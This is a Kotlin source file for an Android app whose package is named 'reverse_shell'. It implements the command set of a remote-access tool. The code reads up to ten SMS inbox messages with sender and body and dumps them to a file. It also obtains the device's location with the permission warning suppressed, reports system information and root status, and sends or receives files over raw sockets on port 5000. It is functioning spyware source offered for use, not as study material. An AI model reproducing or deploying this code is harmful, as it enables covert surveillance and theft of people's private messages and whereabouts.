package com.ironclad.saksham.reverse_shell

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.tasks.await
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.OutputStream
import java.net.ServerSocket
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.Locale


fun getSystemInfo(): String {
    val manufacturer = Build.MANUFACTURER
    val model = Build.MODEL
    val sdk = Build.VERSION.SDK_INT
    val versionRelease = Build.VERSION.RELEASE

    return """
        Manufacturer: $manufacturer 
        Model: $model 
        SDK version: $sdk 
        Android version: $versionRelease
         """.trimIndent()
}

fun checkRoot(): String {
    val paths = arrayOf(
        "/system/app/Superuser.apk",
        "/sbin/su",
        "/system/bin/su",
        "/system/xbin/su",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        "/system/sd/xbin/su",
        "/system/bin/failsafe/su",
        "/data/local/su"
    )

    return if(
        paths.any { path -> File(path).exists()})
    {
        "Device is rooted"
    }
    else{
        "Device is not rooted"
    }
}

fun help():String{
    return """
        ----- Additional Shell Commands -----
        help - show help
        sysinfo - get system information
        checkroot - check if device is rooted
        getSms - Gives all the messages of device
        download - download file from url
        location - get device current location
        
    """.trimIndent()
}

private fun writeMessagesToFile(path:File?, fileName: String, messages:MutableList<String>){
    val file = File(path, fileName)
    FileOutputStream(file).use { output ->
        messages.forEach { message ->
            output.write(message.toByteArray())
        }
    }
}

fun getSms(context: Context): String {
    val messages = mutableListOf<String>()
    val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
    val dateFormat = SimpleDateFormat("yyyy-MM-dd | hh:mm a", Locale.getDefault())

    cursor?.use {
        if (it.moveToFirst()) {
            var count = 0
            do {
                val sms = buildString {
                    appendLine("Date: ${dateFormat.format(it.getLong(it.getColumnIndexOrThrow("date")))}")
                    appendLine("Address: ${it.getString(it.getColumnIndexOrThrow("address"))}")
                    appendLine("Body: ${it.getString(it.getColumnIndexOrThrow("body"))}")
                    appendLine()
                }
                messages.add(sms)
                count++
            } while (it.moveToNext() && count < 10)
        } else {
            throw Exception("No SMS messages found in the inbox.")
        }
    }

    val path = context.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
    writeMessagesToFile(path, "sms.txt", messages)
    return "All messages dumped to $path \n"
}

@RequiresApi(Build.VERSION_CODES.P)
@SuppressLint("MissingPermission")
suspend fun getCurrentLocation(context: Context): Location {

    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    val isLocationEnabled = locationManager.isLocationEnabled

    if (isLocationEnabled){
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
        val lastLocation = fusedLocationClient.lastLocation.await()
        lastLocation.let {
            return lastLocation
        }
    }
    else{
        throw Exception("Location is disabled")
    }
}


data class SmsData(
    val date:String,
    val address:String,
    val body:String
)


fun sendFile(socket: Socket) {
    val filePath = "path_to_file"

    val file = File(filePath)
    val outputStream: OutputStream = socket.getOutputStream()
    val fileInputStream = FileInputStream(file)

    val buffer = ByteArray(1024)
    var bytesRead: Int

    while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
        outputStream.write(buffer, 0, bytesRead)
    }

    fileInputStream.close()
    outputStream.close()
    socket.close()

    println("File sent to server successfully")
}



fun receiveFile() {
    val serverSocket = ServerSocket(5000)
    println("Server is listening on port 5000")

    while (true) {
        val clientSocket = serverSocket.accept()
        println("Client connected: ${clientSocket.inetAddress.hostAddress}")

        val inputStream = clientSocket.getInputStream()
        val file = File("received_file")
        val fileOutputStream = FileOutputStream(file)

        val buffer = ByteArray(1024)
        var bytesRead: Int

        while (inputStream.read(buffer).also { bytesRead = it } != -1) {
            fileOutputStream.write(buffer, 0, bytesRead)
        }

        fileOutputStream.close()
        inputStream.close()
        clientSocket.close()

        println("File received and saved as ${file.absolutePath}")
    }
}
